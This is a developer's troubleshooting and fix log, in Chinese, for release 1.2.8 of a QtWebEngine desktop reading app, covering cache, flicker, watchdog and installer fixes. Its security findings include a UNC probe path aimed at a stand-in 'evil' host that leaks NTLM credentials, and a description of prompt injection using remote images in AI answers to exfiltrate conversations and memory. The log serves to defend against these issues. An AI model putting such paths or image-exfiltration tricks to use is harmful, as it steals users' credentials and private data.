# 1.2.8 排查与修复记录

基线：v1.2.7（`6c379de`）。前端测试 618 → **637**（+19），后端 88 → **109**（+21，skipped 1）。
环境：Windows 11（DPR 2，1536×960 逻辑像素），Intel Arc 130T + RTX 5060 Laptop 双显卡，QtWebEngine 6.14 / Chromium 140。
取证全部在隔离数据目录进行（`build/td-user` 为书库副本、不含凭据；`build/repro-*` 为全新目录）；用户的 `web-cache` 先备份到 `yue-debug/backup/web-cache-20261123`。

## 总表

| # | 级别 | 问题 | 修复提交 | 测试 | 状态 |
| --- | --- | --- | --- | --- | --- |
| B1 | P0 | 首开内容区空白（升级后旧入口页被缓存，请求已删除的 chunk 404） | `5e931fe` `e3ef7f4` `6e4f18f` | `test_static_cache_policy_revalidates_the_entry_page`、`test_web_cache`、`startup-resilience` | 已修，已复现 |
| B1-d | P0 | 渲染进程崩溃 / 卡死后只能重启 | `d6213a3` | `test_watchdog`（真实渲染进程） | 已修 |
| B1-b | — | 首开空白类问题没有任何本机记录 | `a5573e7` `d7a03d6` `6e4f18f` | `test_applog`、`startup-resilience` | 已做 |
| B1-e | P2 | 新装首开（空库 + 背景动画）内容区只剩线稿，无任何引导 | `e0034a7` | `startup-resilience`“新装首开也显示文档库空状态” | 已修（产品取舍见下） |
| B2 | P1 | 打开设置后页面一直闪 | `a09e0e0` | `test_settings_render`（真实前端）、`settings-flicker` | 已修 |
| S1 | P0 | 静态路由把 `%5C%5Chost%5Cshare` 拼成 UNC 再 `resolve()`，泄露 NTLM 凭据 | `1acfb98` | `test_static_paths_never_reach_unc_or_absolute_files` | 已修，已复现 |
| S2 | P0 | AI 回答里的远程图片自动加载，可被提示词注入用来外带对话 / 记忆 | `81e3fb0` | `markdown-images` | 已修 |
| P1-1 | P1 | `target=_blank` 链接（AI 回答、Markdown、PDF）点了没反应 | `0c80976` | `test_external_links`（真实点击） | 已修，已复现 |
| P1-2 | P1 | 重复启动弹 PyInstaller 堆栈；端口文件损坏后永远启动失败 | `70cdd4e` | `test_single_instance` | 已修，已复现 |
| P2-1 | P2 | 关窗时防抖中的保存丢失（阅读位置 / 对话 / 笔迹 / 记忆） | `96df8ed` | `test_quit_flush`（真实页面） | 已修 |
| P2-2 | P2 | 页面重新加载时新事件通道被 1008 拒绝，第一次 AI 请求失败 | `c15e540` | `test_reloaded_page_waits_for_the_old_channel_instead_of_being_refused` | 已修 |
| P2-3 | P2 | 临时文档进度通道泄漏，断线后附件卡在“转换中”、发不出消息 | `5024471` | `sdk-channels`、`materials-surfaces` | 已修 |
| P2-4 | P2 | 出题前存储失败后“开始”按钮永远灰着 | `ec88a52` | `exam-state`“出题前的存储写入失败” | 已修 |
| P2-5 | P2 | 资料同步轮询一次失败就永远显示“正在同步” | `af9a499` | `materials-state`“同步中轮询” | 已修 |
| P2-6 | P2 | 划词翻译不停旧请求，占满 8 个 AI 名额 | `fe4c592` | `auto-translate` | 已修 |
| P2-7 | P3→修 | 本机接口纯文本错误被当 JSON 解析，界面显示语法错误 | `122f73b` | `sdk-channels` | 已修 |

## B1 首次打开：侧栏正常，内容区空白

**级别**：P0（空白）。

**复现**（两种方式都做了）：

1. *1.2.6 启动 → 覆盖安装 1.2.7 → 首开*：用 1.2.6 / 1.2.7 安装包的 `/S /PORTABLE` 模式（即应用内更新走的路径）装到 `build/repro-upgrade/app`，数据目录 `build/repro-upgrade/data`。1.2.6 运行并走过四页后关闭，立即装 1.2.7，安装器自动拉起的首开：
   - 磁盘上是 1.2.7（`assets/index-BeeKJYEl.js`），页面却加载了 **1.2.6 的 `index-CwqALwng.js`**；`navigation.transferSize = 0`（入口页直接取自缓存，未回源），13 个资源全部命中缓存；
   - 点“设置”：请求 `SettingsDialog-Bn6Gpirt.js` → **404**，设置窗静默不出现；没进过的懒加载页同理只剩外壳。
2. *干净 web-cache + 新数据目录*（3 次）：入口正确（`index-BeeKJYEl.js`）、无 404、无报错；内容区只有背景线稿（空库时自动收起文档库的设计，见 B1-e）。

**根因**：`server.py` 的 `static()` 只发 `Last-Modified/ETag`、不发 `Cache-Control`。Chromium 对 200 响应按 `(Date − Last-Modified) × 10%` 计算启发式新鲜期，期内直接复用缓存、不回源。用户缓存里实际存着的条目：`Last-Modified: 22 Nov 15:41 GMT`、`Date: 23 Nov 02:39 GMT`，新鲜期约 1.1 小时。应用内更新后几秒内重启 → 旧入口 → 旧 chunk 名 → 404 → `defineAsyncComponent` 无兜底只渲染注释节点；过了新鲜期再开就恢复，与“关掉重开后恢复正常”吻合。

**修复**：
- a) `lazy()` 包装全部 18 个懒加载组件：200 ms 加载态、失败重试 2 次、启动 90 秒内的 chunk 失败整页刷新一次（会话内 60 秒限一次防循环）、仍失败给错误卡片（对话框类带“关闭”）、30 秒超时；入口 `import('./desktop-app')` 失败也刷新一次或给出说明（`6e4f18f`）。
- b) `window error`（含 script/link 加载失败）、`unhandledrejection`、`vite:preloadError`、Vue `errorHandler`、chunk 失败 → `client_log` → `<数据目录>/logs/app.log`（512 KB × 4，限速 60 条/分，脱敏 token / Bearer / API Key / 用户目录）（`a5573e7`、`d7a03d6`、`6e4f18f`）。
- c) `index.html` 等非哈希文件 `Cache-Control: no-cache`（304 复用），`/assets/` `max-age=31536000, immutable`（`5e931fe`）；升级后首次启动按 `web-cache.version` 清理 `web-cache`，先改名再删、失败不写戳下次重试，只清 HTTP 缓存（`e3ef7f4`）。
- d) 渲染进程看护（`d6213a3`）：非正常退出 → 就地 Reload；2 分钟内再失败 → 换新的 `QWebEnginePage`（新渲染进程，带 token 重进）；超过 4 次停手记日志；无响应用 5 秒心跳判定，连续 9 拍（约 45 秒活动时间）无回音 → 结束渲染进程并按“无响应”恢复；JS 对话框打开期间不计时；恢复后界面提示“已自动重新加载”。保留顶层窗口、只换页面：窗口最大化 / 全屏状态、原生对话框父窗口、拖放过滤器都挂在窗口上，换页面已等价于新的 WebContents（QtWebEngine 6.12 无 `renderProcessUnresponsive` 信号，故用心跳）。

**验证**：
- 开发版删掉 `MaterialsPage` chunk 后点“资料检索”：加载态 → 重试 → 自动刷新一次 → 再点出现错误卡片；`app.log` 记下 `chunk-load` / `reload` / `vue` 三条，无 token。
- 看护：真实 QtWebEngine 中结束渲染进程 → 重载；再结束 → 换新页面且 token 保留；注入 `for(;;){}` → 判定无响应并恢复（`test_watchdog`）。
- 安装包实测见文末。

**证据边界**：用户现场的 web-cache 已是 1.2.7 自己的条目（新鲜期已过），无法回放当时的那一次首开；复现靠同一机制的覆盖安装实验。

### B1-e 新装首开只剩背景线稿（P2，产品取舍）

空库且开着背景动画（新装默认暖色极简 + 背景动画）时，启动后会自动收起文档库，内容区只有慢慢画出的淡色线稿、没有“加入文档”的提示。选保守方案：空库也显示文档库空状态与引导（原有文案），想只看底板点顶栏“文档库”即可收起；有书时行为不变（`e0034a7`）。

## B2 打开设置后页面一直闪

**级别**：P1（高频页面不可用）。

**取证**（覆盖暖色 / 铅笔 / 液态玻璃 / 新液态玻璃 × 浅 / 深色，DPR 2）：
- CDP 连续截图 24 张 + 原生截屏（DWM 合成后）24 张：GPU 合成下整页亮度恒定（如 203.6），帧间只有背景画面区域约 1% 像素弱变化；无整页闪、无弹窗闪。
- DOM 变更：设置开着时 0.5–1.5 次/秒（旁注换句），`<html>` 属性无抖动；排查 SettingsDialog 的 deep watch / `previewAppearance` / `applyTheme` / ManifoldDoodle 的 MutationObserver 链，无循环写入；缩略图预览 `draw()` 不写响应式状态。
- **软件合成**（`--disable-gpu --disable-gpu-compositing`，相当于显卡被列入黑名单 / 远程桌面）：设置一开，页面帧率 **29 → 5**，原生截屏隔帧变化，即“一直闪”。A/B：只暂停背景动画 → 57.5 帧；去掉对话框阴影 4 帧、隐藏对话框 3 帧、去掉遮罩 11 帧。

**根因**：设置等模态窗打开时 ManifoldDoodle 仍按 60 帧重画全窗口画布，上面叠全屏半透明遮罩与对话框，软件合成下每帧都要重新合成整窗。

**修复**（`a09e0e0`）：ManifoldDoodle 新增 `paused`：停主循环、后台线程（统一经 `syncWorker`）、换画面与旁注计时，恢复时时钟后移不跳；缩略图预览不受暂停影响且封顶 30 帧。App 在设置、加入文档、移除确认打开时传 `paused`。

**验证**：设置开着时背景重画 60 → **0** 次/秒、DOM 变更 0，悬停缩略图 30 次/秒，关上恢复 60 次/秒；软件合成下设置开着的帧率 **6 → 55**。回归：`test_settings_render` 在真实前端里断言设置开着 2 秒背景重画 ≤ 2、DOM 变更 ≤ 40（去掉修复时实测 19 次重画、断言失败）。

## 整体排查（边查边修）

由一个只读子代理做全量代码走查（sdk / 事件通道 / 泄漏 / 记忆 / 出题 / 资料 / 后端），每条结论我都单独核实后再改：

- **S1 静态路由 UNC（P0 安全）**：`/%5C%5Cevil%5Cs%5Cx.png` 与 `///evil/s/x.png` 都把 `\\evil\s\x.png` 送进 `resolve()`（探针拦截了真实访问）；静态路由只校验 Host，本机任意网页的 `<img>` 即可触发。改为先做纯字符串校验（反斜杠、冒号、NUL、前导 /、空段、`.`/`..`）再碰文件系统（`1acfb98`）。
- **S2 AI 图片外带（P0 安全）**：`render.ts` 用 markdown-it 默认图片规则、CSP 允许 `img-src https: http:`；改为 http(s) 图片渲染成链接，相对 / 其他地址只显示文字，本地 data/blob 图保留（`81e3fb0`）。
- **P1-1 外链无反应**：真实鼠标点击验证，`_blank` 链接无反应、同窗口对照链接正常；`Page` 接 `newWindowRequested`，只放行 http(s)（`0c80976`）。
- **P1-2 重复启动**：1.2.7 实测弹 “Unhandled exception in script”；改为识别本应用后唤起窗口安静退出（0.9 秒），否则给出说明；端口文件损坏时换新端口（`70cdd4e`）。未做自动换端口：localStorage 按端口隔离，会丢少量本机状态。
- P2-1 … P2-7 见总表。

### P3 / 未修（记录）

| 问题 | 位置 | 理由 |
| --- | --- | --- |
| 恢复备份时先 `freezeStorage()` 再弹文件选择框，选择框开着期间出题 / 记忆写入被丢弃 | `SettingsDialog.vue` `importLibraryBackup` | 需拆分 `library.restoreDatabase` 为“选文件 / 恢复”两步，涉及 sdk 与后端接口，改动面大；只在用户主动恢复备份时出现 |
| `PdfReader` 换数据时 `await task.destroy()` 后未比对 epoch，极端时序下多留一个 pdf.js 加载任务 | `PdfReader.vue:548` | 只在快速连续切换同一阅读器数据时出现，内存随关闭标签释放 |
| `hscroll.ts` 不对移除的子元素 `unobserve`；Markdown 释义注释关闭时未卸载 | `reader/*` | 轻微内存，随标签关闭回收 |
| App 的 `markScrolling` 滚动监听未移除 | `App.vue` | App 不会卸载，无实际影响 |
| 更新安装（`update_install` → `QApplication.quit`）不走关窗保存 | `desktop.py` | 更新前界面已提示并等待；可在后续版本让前端先 flush |

## 回归验证 1.2.7 卡死修复

| 项目 | 结果 |
| --- | --- |
| `npm test` | 637/637（含 `sketch-walk` 6 项） |
| 后端 `unittest` | 109 项 OK（skipped 1） |
| 凯莱图画面、注入 rAF +200 s | 页面 `evaluate` 2–3 ms；渲染进程 10 秒 CPU **2.33 s**（基线 2.38 s，阈值 < 5 s） |
| 正常播放 135 s（越过旧 41 步阈值） | 每 15 秒探测 1–4 ms；点“对话模式” 17 ms 切换成功 |
| 最小化 3 分钟后恢复 | 恢复后 10 秒渲染进程 CPU **2.42 s**（正常动画开销）；`evaluate` 4 ms，点“记忆管理” 6 ms 切换成功 |

## 发版前安装包实测

用 `dist/release/YueqianXingqiong-1.2.8-setup.exe`（SHA256 `409ae683…0905a1`）的 `/S /PORTABLE` 模式（应用内更新走的同一条路径，不写注册表与快捷方式）装到 `build/repro-upgrade/app`，数据目录为书库副本：

| 项目 | 结果 |
| --- | --- |
| 升级前现场 | 该数据目录下 1.2.7 仍在跑 **1.2.6 的入口** `index-CwqALwng.js`（入口页取自缓存、33 个资源全部命中缓存）——旧缓存头的问题在 1.2.7 上依然存在 |
| 覆盖安装 1.2.8 后首开 | 入口 `index-D1062tvy.js`（1.2.8），入口页回源（未用缓存），0 个 404；日志 `start 1.2.8`、`web-cache purged`，`web-cache.version` = 1.2.8 |
| 四页切换 | 对话模式 / 记忆管理 / 资料检索 / 模拟测试 / 全部文档逐一渲染正常 |
| 设置页 | 背景重画 60.5 → **0** 次/秒，DOM 变更 0；悬停缩略图 30.5 次/秒；关上恢复 60 次/秒 |
| 卡死回归：rAF +200 s | `evaluate` 2 ms ×5；渲染进程 10 秒 CPU 1.84 s（基线 2.56 s） |
| 卡死回归：正常播放 135 s | 每 15 秒探测 2–3 ms；点“对话模式” 10 ms |
| 卡死回归：最小化 3 分钟 | 恢复后 10 秒 CPU 2.62 s；`evaluate` 4 ms；点“资料检索” 17 ms 切换成功 |
| 全新数据目录首开 | 入口正确、0 个 404；文档库显示“暂无文档 / 点击‘加入文档’…”空状态（不再只剩线稿）；日志 `web-cache fresh` |
| 打包冒烟 | `--harness-smoke`、`--smoke` 通过；构建内测试：后端 109 项 OK、前端 637/637 |

构建说明：`build-windows.ps1` 设了 `$ErrorActionPreference='Stop'`，在 PowerShell 5.1 里用 `*>` 重定向时，`npm ci` 打到 stderr 的 “npm warn deprecated …” 会变成错误记录并中断构建（本次前两次即在此失败）。`scripts/*` 不可改，最终用进程级重定向 `cmd /c "powershell … -File scriptsuild-windows.ps1 -Test -Release > buildelease-1.2.8.log 2>&1"`：仍是写文件、不走管道。建议后续在脚本里对 npm 调用改用 `$ErrorActionPreference='Continue'` 包裹。
